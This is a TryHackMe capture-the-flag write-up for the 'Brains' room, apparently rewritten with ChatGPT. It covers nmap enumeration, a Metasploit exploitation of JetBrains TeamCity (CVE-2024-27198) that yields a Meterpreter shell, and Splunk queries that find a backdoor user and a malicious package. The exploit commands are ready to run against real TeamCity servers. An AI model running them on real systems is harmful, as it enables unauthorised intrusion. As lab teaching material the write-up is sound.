### Draft for now. I did the room a few days ago and let ChatGPT re-write my Write-up.

# Brains – TryHackMe Write-Up
## Overview / Scope

This write-up documents the completion of the TryHackMe room Brains from both a red-team and blue-team perspective.

The red-team objective was to identify an exposed service, exploit it, and retrieve the user flag.
The blue-team objective was to analyze post-exploitation activity using Splunk and identify attacker footprints on the compromised host.

## Red Team
Initial Enumeration

An initial Nmap scan revealed only two standard services:

SSH on port 22

Apache HTTP on port 80 serving a static maintenance page

No obvious vulnerability was visible at this stage. The web page contained no interactive functionality or parameters.

## Full Port Scan

Since no immediate attack vector was identified, a full TCP port scan was performed:

nmap -sC -sV 10.65.170.60
nmap -p- -T4 -sC -sV 10.65.170.60


This revealed additional services running on high ports:

Java RMI on port 43381

JetBrains TeamCity on port 50000

Accessing:

http://10.65.170.60:50000


exposed a TeamCity login interface.

Vulnerability Identification

The TeamCity instance was identified as:

JetBrains TeamCity 2023.11.3 (build 147512)


This version is vulnerable to:

CVE-2024-27198

CVE-2024-27199

These vulnerabilities allow unauthenticated attackers to bypass authentication and abuse improperly protected REST endpoints, ultimately leading to remote code execution.

The room hint “the city forgot to close its gate” directly referred to the publicly exposed CI/CD service.

## Exploitation

Exploitation was performed using the official Metasploit module:

exploit/multi/http/jetbrains_teamcity_rce_cve_2024_27198


Metasploit usage:

msfconsole
use exploit/multi/http/jetbrains_teamcity_rce_cve_2024_27198
set RHOSTS 10.65.170.60
set RPORT 50000
set SSL false
set TARGETURI /
run


The module:

Bypasses authentication

Creates a temporary administrative token

Uploads a malicious TeamCity plugin

Executes the plugin

Establishes a Meterpreter session

## Post-Exploitation

A Meterpreter session was established as user ubuntu.

Session interaction:

sessions -i 1
ls /home
cd /home/ubuntu
cat flag.txt


The user flag was located in:

/home/ubuntu/flag.txt


The flag value is intentionally omitted in accordance with TryHackMe terms and conditions.

## Blue Team

## Objective

The blue-team task required identifying attacker activity after system compromise using Splunk.

Splunk Access

Splunk was accessible at:

http://10.65.170.60:8000


The provided credentials were used.

Backdoor User Detection

Authentication logs were reviewed using:

index=* useradd
index=* (useradd OR adduser)


A suspicious user account was created shortly after exploitation:

eviluser

The creation timestamp aligned with attacker activity and indicated persistence.

## Malicious Package Installation

Using the timestamp of the backdoor user creation as an anchor point, package management logs were examined:

index=* (apt OR dpkg) install

A package named:

datacollector

was installed during the same timeframe.

The package name was inconsistent with legitimate server configuration and indicated attacker tooling deployment.

# Lessons Learned

A room labeled “Beginner” does not mean exploitation frameworks are off-limits. Real-world tools such as Metasploit are often expected.

Default Nmap scans are insufficient when no obvious attack surface is identified. A full port scan is essential.

Exposed CI/CD systems such as TeamCity represent high-impact targets because they directly enable code execution.

From a defensive perspective, anchoring investigations to confirmed malicious events and pivoting by timestamp is significantly more effective than unfocused searching.

## References

CVE-2024-27198
https://nvd.nist.gov/vuln/detail/CVE-2024-27198

CVE-2024-27199
https://nvd.nist.gov/vuln/detail/CVE-2024-27199

Metasploit Module – JetBrains TeamCity RCE
https://www.rapid7.com/db/modules/exploit/multi/http/jetbrains_teamcity_rce_cve_2024_27198/
